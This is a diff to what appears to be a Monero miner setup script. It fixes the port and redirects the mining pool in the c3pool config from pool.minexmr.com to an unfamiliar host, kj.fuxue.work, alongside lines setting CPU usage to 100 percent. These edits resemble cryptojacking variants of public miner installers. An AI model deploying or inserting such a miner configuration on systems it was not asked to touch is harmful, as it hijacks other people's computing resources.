@@ -181,13 +181,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 12 / 1000 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 4444 ))
+PORT=$(( 3333 ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "4444" -o "$PORT" -gt "4444" ]; then
+if [ "$PORT" -lt "3333" -o "$PORT" -gt "3333" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -295,7 +295,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:'$PORT'",/' $HOME/c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "kj.fuxue.work:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
